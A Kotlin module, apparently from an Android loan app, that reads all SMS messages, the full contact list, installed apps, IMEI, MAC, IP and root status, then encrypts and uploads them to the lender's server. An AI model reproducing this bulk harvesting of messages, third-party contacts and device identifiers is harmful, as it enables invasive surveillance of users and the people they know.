package com.loan.icreditapp.collect

import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.ApplicationInfo
import android.database.Cursor
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import android.util.Log
import com.blankj.utilcode.util.*
import com.blankj.utilcode.util.ThreadUtils.SimpleTask
import com.loan.icreditapp.BuildConfig
import com.loan.icreditapp.api.Api
import com.loan.icreditapp.bean.auth.AuthResponseBean
import com.loan.icreditapp.collect.bean.AppInfoRequest
import com.loan.icreditapp.collect.bean.CallRecordRequest
import com.loan.icreditapp.collect.bean.ContactRequest
import com.loan.icreditapp.collect.bean.SmsRequest
import com.loan.icreditapp.global.Constant
import com.loan.icreditapp.util.BuildRequestJsonUtils
import com.loan.icreditapp.util.CheckResponseUtils
import com.loan.icreditapp.util.EncodeUtils
import com.lzy.okgo.OkGo
import com.lzy.okgo.callback.StringCallback
import com.lzy.okgo.model.Response
import org.json.JSONObject
import java.io.UnsupportedEncodingException
import java.net.URLEncoder

class CollectDataMgr {

    private val TAG = "CollectDataMgr"

    private var mManager: CollectDataMgr? = null

    companion object {
        val sInstance by lazy(LazyThreadSafetyMode.NONE) {
            CollectDataMgr()
        }
    }

    fun collectAuthData(context: Context, orderId :String , observer: Observer?) {
        ThreadUtils.executeByCached(object : SimpleTask<Any?>() {
            @Throws(Throwable::class)
            override fun doInBackground(): Any {
                try {
                    val smsStr = EncodeUtils.encryptAES(GsonUtils.toJson(readSms(context)))
                    val callRecordStr = ""
//                        EncodeUtils.encryptAES(GsonUtils.toJson(readCallRecord(context)))
                    val contractStr =
                        EncodeUtils.encryptAES(GsonUtils.toJson(readContract(context)))
                    val appInfoStr = EncodeUtils.encryptAES(GsonUtils.toJson(readAllAppInfo()))
                    val locationBean =
                        EncodeUtils.encryptAES(GsonUtils.toJson(LocationMgr.getInstance().locationBean))
                    val jsonObject = buildRequestJsonObj(
                        smsStr, callRecordStr, contractStr,
                        appInfoStr, locationBean, orderId
                    )
                    getAuthData(jsonObject, observer)
                } catch (e : Exception){
                    if (BuildConfig.DEBUG){
                        throw e
                    }
                }
                return ""
            }

            override fun onSuccess(result: Any?) {

            }

        })
    }

    @SuppressLint("MissingPermission")
    private fun buildRequestJsonObj(smsStr: String, callRecordStr: String,
                                    contractStr: String, appListStr: String,
                                    locationStr: String, orderId: String): JSONObject {
        val jsonObject: JSONObject = BuildRequestJsonUtils.buildRequestJson()
        if (BuildConfig.DEBUG){
//            Log.i("okhttp","1 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(contractStr) + "")
//            Log.i("okhttp","2 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(smsStr) + "")
//            Log.i("okhttp","3 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(callRecordStr) + "")
//            Log.i("okhttp","4 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(appListStr) + "")
        }
        try {
            jsonObject.put("accountId", Constant.mAccountId)
            //申请订单ID
            jsonObject.put("orderId", orderId)
            //通讯录json
            jsonObject.put("contacts", contractStr)
            //短信记录json
            jsonObject.put("sms", smsStr)
            //通话记录json
            jsonObject.put("call", callRecordStr)
            //app安装列表json
            jsonObject.put("appList", appListStr)
            //GPS位置json
            jsonObject.put("gps", "")
//            jsonObject.put("gps", locationStr)
            //网络IP
            jsonObject.put("userIp", NetworkUtils.getIPAddress(true))
            //公网IP
            jsonObject.put("pubIp", NetworkUtils.getIpAddressByWifi())
            //手机IMEI
            jsonObject.put("imei",  PhoneUtils.getIMEI())
            //androidId
            jsonObject.put("androidId",  DeviceUtils.getAndroidID())
            jsonObject.put("deviceUniqId",  DeviceUtils.getUniqueDeviceId())
            jsonObject.put("mac",  DeviceUtils.getMacAddress())
            //手机品牌型号
            jsonObject.put("brand",  DeviceUtils.getManufacturer())
            jsonObject.put("innerVersionCode",  AppUtils.getAppVersionCode())
            jsonObject.put("isRooted", if ( DeviceUtils.isDeviceRooted()) 1 else 0)
            jsonObject.put("isEmulator",  if (DeviceUtils.isEmulator()) 1 else 0)
        } catch (e: java.lang.Exception) {
            e.printStackTrace()
            if (BuildConfig.DEBUG){
                throw e
            }
        }
        return jsonObject
    }

    private fun readSms(context: Context): ArrayList<SmsRequest>? {
        val list: ArrayList<SmsRequest> = ArrayList<SmsRequest>()
        val uri = Uri.parse("content://sms/")
        val projection =
            arrayOf("_id", "address", "person", "body", "date", "type", "status", "read")
        val resolver = context.contentResolver
        val cursor = resolver.query(uri, projection, null, null, null)
        try {
            if (cursor != null && cursor.count > 0) {
                while (cursor.moveToNext()) {
                    val _id = cursor.getInt(0) //id
                    val address = cursor.getString(1) //电话号码
                    val body = cursor.getString(3) //短信内容
                    val date = cursor.getLong(4)
                    val type = cursor.getInt(5)
                    val status = cursor.getInt(6)
                    val read = cursor.getInt(7)
                    val smsRequest = SmsRequest()
                    smsRequest.addr = encodeData(address)
                    smsRequest.body = encodeData(body)
                    smsRequest.time = date
                    smsRequest.type = type
                    smsRequest.status = status
                    smsRequest.read = read
                    //                    public int read;
//                    public int status;
                    smsRequest.addr = address
                    list.add(smsRequest)
                }
            }
        } catch (e: Exception) {
            if (BuildConfig.DEBUG) {
                throw e
            }
        } finally {
            cursor?.close()
        }
        return list
    }

    private fun readCallRecord(context: Context): ArrayList<CallRecordRequest> {
        val callRecordList = ArrayList<CallRecordRequest>()
        val cr = context.contentResolver
        val uri = CallLog.Calls.CONTENT_URI
        val projection = arrayOf(
            CallLog.Calls.NUMBER, CallLog.Calls.DATE,
            CallLog.Calls.TYPE
        )
        var cursor: Cursor? = null
        try {
            cursor = cr.query(uri, projection, null, null, null)
            while (cursor!!.moveToNext()) {
                val number = cursor.getString(0)
                val date = cursor.getLong(1)
                val type = cursor.getInt(2)
                callRecordList.add(CallRecordRequest(number, date, type))
            }
        } catch (e: Exception) {
            e.printStackTrace()
            Log.e(TAG, "read cardCord exception = $e")
        } finally {
            cursor?.close()
        }
        return callRecordList
    }

    @SuppressLint("Range")
    private fun readContract(context: Context): ArrayList<ContactRequest>? {
        //调用并获取联系人信息
        var cursor: Cursor? = null
        val list: ArrayList<ContactRequest> = ArrayList<ContactRequest>()
        try {
            cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    val id =
                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone._ID))
                    val displayName =
                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val number =
                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                    val lastUpdateTime =
                        cursor.getLong(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP))
                    //                    Log.e(TAG, " photo = " + photoUri + "  ringtone = " + ringtone + " look = " + lookupUri);
                    val contactRequest = ContactRequest()
                    contactRequest.name = displayName
                    contactRequest.number = number
                    contactRequest.lastUpdate = lastUpdateTime
                    list.add(contactRequest)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
            Log.e(TAG, " exception = $e")
        } finally {
            cursor?.close()
        }
        return list
    }

    private fun readAllAppInfo(): ArrayList<AppInfoRequest> {
        val list: ArrayList<AppInfoRequest> = ArrayList<AppInfoRequest>()
        val pm = Utils.getApp().packageManager ?: return list
        val installedPackages = pm.getInstalledPackages(0)
            ?: return list
        for (i in installedPackages.indices) {
            val packageInfo = installedPackages[i]
            val appInfoRequest = AppInfoRequest()
            appInfoRequest.packageName = packageInfo.packageName
            appInfoRequest.lu = packageInfo.lastUpdateTime
            appInfoRequest.it = packageInfo.firstInstallTime
            val ai = packageInfo.applicationInfo
            if (ai != null) {
                val isSystem = ApplicationInfo.FLAG_SYSTEM and ai.flags != 0
                appInfoRequest.type = if (isSystem) 0 else 1
                try {
                    appInfoRequest.name = ai.loadLabel(pm).toString()
                } catch (e: Exception) {
                }
            }
            list.add(appInfoRequest)
        }
        return list
    }

    @SuppressLint("MissingPermission")
    private fun getAuthData(jsonObject: JSONObject , observer: Observer?) {
        OkGo.post<String>(Api.UPLOAD_AUTH).tag(TAG).
        upJson(jsonObject)
            .execute(object : StringCallback() {
                override fun onSuccess(response: Response<String>) {
//                        Log.i(TAG, " response success= " + response.body());
                    var authBean : AuthResponseBean? =  CheckResponseUtils.checkResponseSuccess(response, AuthResponseBean::class.java)
                    if (authBean != null && authBean?.hasUpload == true) {
                        observer?.success(response)
                    } else {
                        observer?.failure(response)
                    }
                }

                override fun onError(response: Response<String>) {
                    super.onError(response)
                    //                        Log.i(TAG, "getAuthData response error = ");
                    observer?.failure(response)
                }
            })
    }

    private fun getHardwareData(){

    }

    fun encodeData(s: String): String? {
        if (StringUtils.isEmpty(s)) {
            return null
        }
        val s1 =
            s.replace("%".toRegex(), "").replace("\\+".toRegex(), "").replace("\"".toRegex(), "")
                .replace("'".toRegex(), "").replace("\\\\".toRegex(), "")
        try {
            return URLEncoder.encode(s1, "utf-8")
        } catch (e: UnsupportedEncodingException) {
            e.printStackTrace()
        }
        return null
    }

    interface Observer {
        fun success(response: Response<String>?)
        fun failure(response: Response<String>?)
    }
}